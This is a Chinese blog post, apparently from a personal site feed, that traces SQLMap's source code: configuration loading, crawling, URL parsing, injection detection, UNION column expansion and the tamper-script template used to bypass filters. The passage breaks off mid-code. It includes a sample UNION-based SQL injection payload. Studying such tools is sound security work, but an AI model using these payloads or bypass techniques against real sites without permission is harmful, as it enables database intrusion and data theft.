    <content type="html"><![CDATA[<h1 id="SQLMap原理及其深入"><a href="#SQLMap原理及其深入" class="headerlink" title="SQLMap原理及其深入"></a>SQLMap原理及其深入</h1><h2 id="结构"><a href="#结构" class="headerlink" title="结构"></a>结构</h2><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs stylus">文件/文件夹 说明<br>data/ 数据库注入检测载荷、用户自定义攻击载荷、字典、shell命令、数据库触发顺序等<br><br>extra/ 一些额外功能，例如发出声响（beep）、运行cmd、安全执行、shellcode等<br><br>lib/ 包含了sqlmap的多种连接库，如五种注入类型请求的参数、提权操作等。<br><br>plugins/ 数据库信息和数据库通用事项<br><br>tamper/ 绕过脚本<br><br>thirdparty/ sqlmap使用的第三方的插件<br><br>sqlmap<span class="hljs-selector-class">.conf</span> sqlmap的配置文件，如各种默认参数（默认是没有设置参数、可设置默认参数进行批量或者自动化检测）<br><br>sqlmap<span class="hljs-selector-class">.py</span> sqlmap主程序文件<br><br>sqlmapapi<span class="hljs-selector-class">.py</span> sqlmap的api文件，可以将sqlmap集成到其他平台上<br><br>swagger<span class="hljs-selector-class">.yaml</span> api文档<br></code></pre></td></tr></table></figure><h2 id="主函数分析"><a href="#主函数分析" class="headerlink" title="主函数分析"></a>主函数分析</h2><h3 id="两个重要的全局变量介绍"><a href="#两个重要的全局变量介绍" class="headerlink" title="两个重要的全局变量介绍"></a>两个重要的全局变量介绍</h3><p>conf和kb是sqlmap的两个全局变量，它们分别存储了sqlmap的配置信息和知识库信息。</p><p>conf是一个字典，它包含了sqlmap的运行时参数，如目标URL，代理设置，注入技术，数据输出格式等。conf的值可以通过命令行参数，配置文件或交互式模式来设置或修改。conf的内容会影响sqlmap的行为和输出。</p><p>kb是一个自定义类的实例，它包含了sqlmap在扫描过程中收集到的信息，如目标数据库类型，版本，表名，列名，注入点，有效的payload等。kb的值会根据sqlmap的探测结果不断更新和扩充。kb的内容会帮助sqlmap优化注入策略和提高效率。</p><p>conf和kb是sqlmap的核心组件，它们在sqlmap.py中被初始化，并在整个项目中被引用和使用。</p><h3 id="正式分析"><a href="#正式分析" class="headerlink" title="正式分析"></a>正式分析</h3><p>将断点打到loadBoundaries处，我们来看看他的执行过程</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231010211713347.png" alt="image-20231010211713347"> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">loadBoundaries</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">    Loads boundaries from XML</span><br><span class="hljs-string"></span><br><span class="hljs-string">    &gt;&gt;&gt; conf.boundaries = []</span><br><span class="hljs-string">    &gt;&gt;&gt; loadBoundaries()</span><br><span class="hljs-string">    &gt;&gt;&gt; len(conf.boundaries) &gt; 0</span><br><span class="hljs-string">    True</span><br><span class="hljs-string">    &quot;&quot;&quot;</span><br><br>    <span class="hljs-keyword">try</span>:<br>        doc = et.parse(paths.BOUNDARIES_XML)<br>    <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>        errMsg = <span class="hljs-string">&quot;something appears to be wrong with &quot;</span><br>        errMsg += <span class="hljs-string">&quot;the file &#x27;%s&#x27; (&#x27;%s&#x27;). Please make &quot;</span> % (paths.BOUNDARIES_XML, getSafeExString(ex))<br>        errMsg += <span class="hljs-string">&quot;sure that you haven&#x27;t made any changes to it&quot;</span><br>        <span class="hljs-keyword">raise</span> SqlmapInstallationException(errMsg)<br><br>    root = doc.getroot()<br>    <span class="hljs-comment">#调用了这个函数去解析xml里面的内容</span><br>    parseXmlNode(root)<br></code></pre></td></tr></table></figure><p>xml树的详细写法可以参考这个<a href="https://docs.python.org/3/library/xml.etree.elementtree.html">文档</a></p><p>上面的语句中，<code>doc.getroot()</code>相当于拿到了<code>xml</code>树的结构，之后就可以随便获取元素的值了，接着往下看<code>parseXmlNode</code>函数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">parseXmlNode</span>(<span class="hljs-params">node</span>):<br>    <span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> node.findall(<span class="hljs-string">&quot;boundary&quot;</span>):<br>        boundary = AttribDict()<br><br>        <span class="hljs-keyword">for</span> child <span class="hljs-keyword">in</span> element:<br>            <span class="hljs-keyword">if</span> child.text:<br>                values = cleanupVals(child.text, child.tag)<br>                boundary[child.tag] = values<br>            <span class="hljs-keyword">else</span>:<br>                boundary[child.tag] = <span class="hljs-literal">None</span><br><br>        conf.boundaries.append(boundary)<br><br>    <span class="hljs-keyword">for</span> element <span class="hljs-keyword">in</span> node.findall(<span class="hljs-string">&quot;test&quot;</span>):<br>        test = AttribDict()<br><br>        <span class="hljs-keyword">for</span> child <span class="hljs-keyword">in</span> element:<br>            <span class="hljs-keyword">if</span> child.text <span class="hljs-keyword">and</span> child.text.strip():<br>                values = cleanupVals(child.text, child.tag)<br>                test[child.tag] = values<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(child.findall(<span class="hljs-string">&quot;*&quot;</span>)) == <span class="hljs-number">0</span>:<br>                    test[child.tag] = <span class="hljs-literal">None</span><br>                    <span class="hljs-keyword">continue</span><br>                <span class="hljs-keyword">else</span>:<br>                    test[child.tag] = AttribDict()<br><br>                <span class="hljs-keyword">for</span> gchild <span class="hljs-keyword">in</span> child:<br>                    <span class="hljs-keyword">if</span> gchild.tag <span class="hljs-keyword">in</span> test[child.tag]:<br>                        prevtext = test[child.tag][gchild.tag]<br>                        test[child.tag][gchild.tag] = [prevtext, gchild.text]<br>                    <span class="hljs-keyword">else</span>:<br>                        test[child.tag][gchild.tag] = gchild.text<br><br>        conf.tests.append(test)<br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">boundary</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">level</span>&gt;</span>3<span class="hljs-tag">&lt;/<span class="hljs-name">level</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">clause</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">clause</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">where</span>&gt;</span>1,2<span class="hljs-tag">&lt;/<span class="hljs-name">where</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">ptype</span>&gt;</span>1<span class="hljs-tag">&lt;/<span class="hljs-name">ptype</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">prefix</span>&gt;</span>)<span class="hljs-tag">&lt;/<span class="hljs-name">prefix</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">suffix</span>&gt;</span>[GENERIC_SQL_COMMENT]<span class="hljs-tag">&lt;/<span class="hljs-name">suffix</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">boundary</span>&gt;</span><br></code></pre></td></tr></table></figure><p>我们把他拎出来看看这个究竟是如何一步步获取到xml里面的内容的</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231010231019510.png" alt="image-20231010231019510"> </p><p>第一次循环时<code>child.text</code>的值为3</p><p>经过了一次循环成功获取了child了我们xml文档的第一个子标签，最后就能够成功获取所有值boundaries的内容，这里并没有使用到test内容，但是在下面的一些加载函数中就会使用到了</p><p>最后进入到了start函数，开始正式执行<code>sqlmap</code>，注意这里的start函数不要打错地方了，我分析的时候打在了226行，但是实际上他是在224行</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231012145356736.png" alt="image-20231012145356736"> </p><p>命令行也有反映了</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231012135929646.png" alt="image-20231012135929646"> </p><h2 id="爬虫模块与url解析"><a href="#爬虫模块与url解析" class="headerlink" title="爬虫模块与url解析"></a>爬虫模块与url解析</h2><p> <img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231012150331317.png" alt="image-20231012150331317"> </p><p>前面是一些简单的参数参数设置，有一个有趣的地方是爬虫分析，我们来详细看这个模块</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> conf.crawlDepth <span class="hljs-keyword">and</span> conf.bulkFile:<br>    targets = getFileItems(conf.bulkFile)<br><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-built_in">len</span>(targets)):<br>        target = <span class="hljs-literal">None</span><br><br>        <span class="hljs-keyword">try</span>:<br>            kb.targets = OrderedSet()<br>            target = targets[i]<br><br>            <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.search(<span class="hljs-string">r&quot;(?i)\Ahttp[s]*://&quot;</span>, target):<br>                target = <span class="hljs-string">&quot;http://%s&quot;</span> % target<br><br>            infoMsg = <span class="hljs-string">&quot;starting crawler for target URL &#x27;%s&#x27; (%d/%d)&quot;</span> % (target, i + <span class="hljs-number">1</span>, <span class="hljs-built_in">len</span>(targets))<br>            logger.info(infoMsg)<br><span class="hljs-comment">#重要的函数在这里</span><br>            crawl(target)<br>        <span class="hljs-keyword">except</span> Exception <span class="hljs-keyword">as</span> ex:<br>            <span class="hljs-keyword">if</span> target <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">isinstance</span>(ex, SqlmapUserQuitException):<br>                errMsg = <span class="hljs-string">&quot;problem occurred while crawling &#x27;%s&#x27; (&#x27;%s&#x27;)&quot;</span> % (target, getSafeExString(ex))<br>                logger.error(errMsg)<br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-keyword">raise</span><br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-keyword">if</span> kb.targets:<br>                start()<br></code></pre></td></tr></table></figure><p>重要的函数是<code>crawl(target)</code>，点进去看的话大致就是找到<code>html</code>标签，然后解析其连接，经过一种判断以后可以将其加入到一个新的<code>url</code>中去，然后在对这个新的<code>url</code>进行启动<code>start()</code>方法</p><p>了解完了上面那些内容，我们就可以进入<code>start()</code>函数了</p><p>我们来到<code>parseTargetUrl()</code>看看他是做什么的</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231012145013945.png" alt="image-20231012145013945"> </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.search(<span class="hljs-string">r&quot;^(http|ws)s?://&quot;</span>, conf.url, re.I):<br>    <span class="hljs-comment">#没匹配到http和ws的情况</span><br>    <span class="hljs-keyword">if</span> re.search(<span class="hljs-string">r&quot;:443\b&quot;</span>, conf.url):<br>        conf.url = <span class="hljs-string">&quot;https://%s&quot;</span> % conf.url<br>    <span class="hljs-keyword">else</span>:<br>        conf.url = <span class="hljs-string">&quot;http://%s&quot;</span> % conf.url<br></code></pre></td></tr></table></figure><p>没有输入协议的话先手动加入协议的选项</p><p>这里有一个有趣的正则表达式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">hostnamePort = urlSplit.netloc.split(<span class="hljs-string">&quot;:&quot;</span>) <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> re.search(<span class="hljs-string">r&quot;\[.+\]&quot;</span>, urlSplit.netloc) <span class="hljs-keyword">else</span> filterNone((re.search(<span class="hljs-string">r&quot;\[.+\]&quot;</span>, urlSplit.netloc).group(<span class="hljs-number">0</span>), re.search(<span class="hljs-string">r&quot;\](:(?P&lt;port&gt;\d+))?&quot;</span>, urlSplit.netloc).group(<span class="hljs-string">&quot;port&quot;</span>)))<br><br></code></pre></td></tr></table></figure><p>从一个 URL 中提取主机名和端口号，如果 URL 包含方括号，就用正则表达式匹配方括号内的内容和冒号后的数字，如果不包含方括号，就用冒号分割字符串。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">conf.scheme = (urlSplit.scheme.strip().lower() <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;http&quot;</span>)<br>conf.path = urlSplit.path.strip()<br>conf.hostname = hostnamePort[<span class="hljs-number">0</span>].strip()<br></code></pre></td></tr></table></figure><p>之后便是一些协议，路径的取值，还有一些简单的配置，就不再赘述</p><h2 id="WAF检测"><a href="#WAF检测" class="headerlink" title="WAF检测"></a>WAF检测</h2><p>当解析完url中，就会进行waf检测了</p><p>这里面有很多很相似度检测的地方</p><h2 id="注入检测"><a href="#注入检测" class="headerlink" title="注入检测"></a>注入检测</h2><h3 id="启发性检测"><a href="#启发性检测" class="headerlink" title="启发性检测"></a>启发性检测</h3><p>当检测完waf，我们就会开始我们的注入检测了</p><p>这里有一个地方困扰了我好久，没搞明白为什么没进入这一块，最后才发现是这个testSqlInj的锅</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python">testSqlInj = <span class="hljs-literal">False</span><br><br><span class="hljs-keyword">if</span> PLACE.GET <span class="hljs-keyword">in</span> conf.parameters <span class="hljs-keyword">and</span> <span class="hljs-keyword">not</span> <span class="hljs-built_in">any</span>((conf.data, conf.testParameter)):<br>    <span class="hljs-keyword">for</span> parameter <span class="hljs-keyword">in</span> re.findall(<span class="hljs-string">r&quot;([^=]+)=([^%s]+%s?|\Z)&quot;</span> % (<br>    re.escape(conf.paramDel <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">or</span> DEFAULT_GET_POST_DELIMITER,<br>    re.escape(conf.paramDel <span class="hljs-keyword">or</span> <span class="hljs-string">&quot;&quot;</span>) <span class="hljs-keyword">or</span> DEFAULT_GET_POST_DELIMITER), conf.parameters[PLACE.GET]):<br>        paramKey = (conf.hostname, conf.path, PLACE.GET, parameter[<span class="hljs-number">0</span>])<br><br>        <span class="hljs-keyword">if</span> paramKey <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> kb.testedParams:<br>            testSqlInj = <span class="hljs-literal">True</span><br>            <span class="hljs-keyword">break</span><br><span class="hljs-keyword">else</span>:<br>    paramKey = (conf.hostname, conf.path, <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span>)<br>    <span class="hljs-keyword">if</span> paramKey <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> kb.testedParams:<br>        testSqlInj = <span class="hljs-literal">True</span><br><br><span class="hljs-keyword">if</span> testSqlInj <span class="hljs-keyword">and</span> conf.hostname <span class="hljs-keyword">in</span> kb.vulnHosts:<br>    <span class="hljs-keyword">if</span> kb.skipVulnHost <span class="hljs-keyword">is</span> <span class="hljs-literal">None</span>:<br>        message = <span class="hljs-string">&quot;SQL injection vulnerability has already been detected &quot;</span><br>        message += <span class="hljs-string">&quot;against &#x27;%s&#x27;. Do you want to skip &quot;</span> % conf.hostname<br>        message += <span class="hljs-string">&quot;further tests involving it? [Y/n]&quot;</span><br><br>        kb.skipVulnHost = readInput(message, default=<span class="hljs-string">&#x27;Y&#x27;</span>, boolean=<span class="hljs-literal">True</span>)<br><br>    testSqlInj = <span class="hljs-keyword">not</span> kb.skipVulnHost<br><br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> testSqlInj:<br>    infoMsg = <span class="hljs-string">&quot;skipping &#x27;%s&#x27;&quot;</span> % targetUrl<br>    logger.info(infoMsg)<br>    <span class="hljs-keyword">continue</span><br></code></pre></td></tr></table></figure><h3 id="启发检测"><a href="#启发检测" class="headerlink" title="启发检测"></a>启发检测</h3><h3 id="正式检测"><a href="#正式检测" class="headerlink" title="正式检测"></a>正式检测</h3><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231016193146434.png" alt="image-20231016193146434"> </p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231016193906549.png" alt="image-20231016193906549"> </p><p>这里的clause参数在boundaries里面有详细说明是做什么的，他表示使用什么查询语句</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231016193855265.png" alt="image-20231016193855265"> </p><p>在判断联合查询注入时，用到了这个语句</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python">            <span class="hljs-keyword">if</span> stype == PAYLOAD.TECHNIQUE.UNION:<span class="hljs-comment">#检测到测试类型是联合注入的话</span><br>                configUnion(test.request.char)<span class="hljs-comment">#设置合适的联合查询字符</span><br>            ...<br>match = re.search(<span class="hljs-string">r&quot;(\d+)-(\d+)&quot;</span>, test.request.columns)<br><span class="hljs-keyword">if</span> match <span class="hljs-keyword">and</span> injection.data:<br>    lower, upper = <span class="hljs-built_in">int</span>(match.group(<span class="hljs-number">1</span>)), <span class="hljs-built_in">int</span>(match.group(<span class="hljs-number">2</span>))<br>    <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> (lower, upper):<br>        <span class="hljs-keyword">if</span> _ &gt; <span class="hljs-number">1</span>:<br>            __ = <span class="hljs-number">2</span> * (_ - <span class="hljs-number">1</span>) + <span class="hljs-number">1</span> <span class="hljs-keyword">if</span> _ == lower <span class="hljs-keyword">else</span> <span class="hljs-number">2</span> * _<br>            unionExtended = <span class="hljs-literal">True</span><br>            test.request._columns = test.request.columns<br>            test.request.columns = re.sub(<span class="hljs-string">r&quot;\b%d\b&quot;</span> % _, <span class="hljs-built_in">str</span>(__), test.request.columns)<br>            title = re.sub(<span class="hljs-string">r&quot;\b%d\b&quot;</span> % _, <span class="hljs-built_in">str</span>(__), title)<br>            test.title = re.sub(<span class="hljs-string">r&quot;\b%d\b&quot;</span> % _, <span class="hljs-built_in">str</span>(__), test.title)<br></code></pre></td></tr></table></figure><p>他的目的时增加查询列数，例如原先语句是这样的</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> <span class="hljs-type">name</span> <span class="hljs-keyword">FROM</span> Products <span class="hljs-keyword">WHERE</span> id=<span class="hljs-number">1</span><br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,version(),<span class="hljs-keyword">NULL</span><br></code></pre></td></tr></table></figure><p>经过增加列数以后，变成</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">SELECT</span> name <span class="hljs-keyword">FROM</span> Products <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span><br><span class="hljs-keyword">UNION</span><br><span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,version(),<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span>,<span class="hljs-keyword">NULL</span><br></code></pre></td></tr></table></figure><p>在这里有<code>initTargetEnv()</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">    <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">stackedmethod</span>(<span class="hljs-params">f</span>):<br><span class="hljs-meta">    @functools.wraps(<span class="hljs-params">f</span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_</span>(<span class="hljs-params">*args, **kwargs</span>):<br>        threadData = getCurrentThreadData()<br>        originalLevel = <span class="hljs-built_in">len</span>(threadData.valueStack)<br><br>        <span class="hljs-keyword">try</span>:<br>            result = f(*args, **kwargs)<br></code></pre></td></tr></table></figure><p>我们看这个函数，关注一下<code>@functools.wraps(f)</code>的用法</p><blockquote><p><code>@functools.wraps(f)</code> 是一个装饰器，它用于修改一个函数或方法，将 f 的元数据（如函数名、文档字符串、参数列表等）复制到被装饰的函数上。这样可以保持被装饰函数的原始信息，而不会被装饰器的影响。</p><p>看下面官网的例子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> functools <span class="hljs-keyword">import</span> wraps<br><span class="hljs-keyword">def</span> <span class="hljs-title function_">my_decorator</span>(<span class="hljs-params">f</span>):<br><span class="hljs-meta">    @wraps(<span class="hljs-params">f</span>)</span><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">wrapper</span>(<span class="hljs-params">*args, **kwds</span>):<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Calling decorated function&#x27;</span>)<br>        <span class="hljs-keyword">return</span> f(*args, **kwds)<br>    <span class="hljs-keyword">return</span> wrapper<br><br><span class="hljs-meta">@my_decorator</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">example</span>():<br>    <span class="hljs-string">&quot;&quot;&quot;Docstring&quot;&quot;&quot;</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Called example function&#x27;</span>)<br><br>example()<br>Calling decorated function<br>Called example function<br>example.__name__<br><span class="hljs-string">&#x27;example&#x27;</span><br>example.__doc__<br><span class="hljs-string">&#x27;Docstring&#x27;</span><br></code></pre></td></tr></table></figure></blockquote><p>当我们执行到result时，就会开始我们的执行查询语句</p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231012140722536.png" alt="image-20231012140722536"> </p><p><img src="https://enjoyy-1322917755.cos.ap-nanjing.myqcloud.com/image-20231012144339278.png" alt="image-20231012144339278"> </p><p>但是执行到这里的话payload已经被拼接完成了，我比较感兴趣的地方是payload的拼接的地方，让我们往前回溯，找找payload是在哪里被拼接的</p><p>经过了一系列的从kb与conf中取得值并做相应的判断，我们看到了一个有趣的地方，就是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">if</span> cmdLineOptions.get(<span class="hljs-string">&quot;sqlmapShell&quot;</span>):<br>    cmdLineOptions.clear()<br>    conf.clear()<br>    kb.clear()<br>    conf.disableBanner = <span class="hljs-literal">True</span><br>    main()<br></code></pre></td></tr></table></figure><p>这里就是实现sqlshell的地方了</p><h2 id="tamper"><a href="#tamper" class="headerlink" title="tamper"></a>tamper</h2><h3 id="模板"><a href="#模板" class="headerlink" title="模板"></a>模板</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#!/usr/bin/env python</span><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)</span><br><span class="hljs-string">See the file &#x27;LICENSE&#x27; for copying permission</span><br><span class="hljs-string">&quot;&quot;&quot;</span> <br><span class="hljs-comment"># 导入SQLMap中lib\core\enums中的PRIORITY优先级函数</span><br><span class="hljs-keyword">from</span> lib.core.enums <span class="hljs-keyword">import</span> PRIORITY<br><span class="hljs-comment"># 定义脚本优先级</span><br>__priority__ = PRIORITY.LOW<br><span class="hljs-comment"># 对当前脚本的介绍，可以为空</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">dependencies</span>():<br> <span class="hljs-keyword">pass</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">对传进来的payload进行修改并返回</span><br><span class="hljs-string">函数有两个参数。主要更改的是payload参数，kwargs参数用得不多。在官方提供的</span><br><span class="hljs-string">Tamper脚本中</span><br><span class="hljs-string"> 只被使用了两次，两次都只是更改了http-header</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">tamper</span>(<span class="hljs-params">payload, **kwargs</span>):<br> <span class="hljs-comment"># 增加相关的payload处理，再将payload返回</span><br> <span class="hljs-comment"># 必须返回最后的payload</span><br> <span class="hljs-keyword">return</span> payload<br><br><br></code></pre></td></tr></table></figure><p>没看懂的模块</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">bluecoat</span><br></code></pre></td></tr></table></figure><h3 id="典型正则表达式解析"><a href="#典型正则表达式解析" class="headerlink" title="典型正则表达式解析"></a>典型正则表达式解析</h3><h4 id="匹配-1-AND-A-gt-B"><a href="#匹配-1-AND-A-gt-B" class="headerlink" title="匹配 1 AND A &gt; B"></a>匹配 1 AND A &gt; B</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">match = re.search(<span 